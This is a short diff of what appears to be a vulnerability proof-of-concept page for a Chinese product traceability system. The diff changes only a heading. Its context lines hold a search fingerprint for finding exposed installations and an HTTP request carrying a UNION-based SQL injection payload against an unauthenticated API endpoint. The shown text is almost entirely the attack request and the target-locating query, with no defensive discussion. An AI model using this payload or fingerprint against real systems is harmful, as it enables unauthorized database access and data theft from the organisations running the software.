@@ -7,7 +7,7 @@
 (body="chunk-libs.45edf705.css" && title="产品追溯系统") || title="4.1.0追溯系统"
 ```
 
-## poc
+## POC
 ```javascript
 GET /api/org/enterpriseaccountnoauth/geticp?enterprise_code=1%27)%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,CONCAT(0x71787a6271,0x4e754b52684541696a424d6d7346475364634d6e4d426a4261466f51717577564359486f7a594571,0x71767a7171),NULL,NULL,NULL--%20- HTTP/1.1
 Host: 
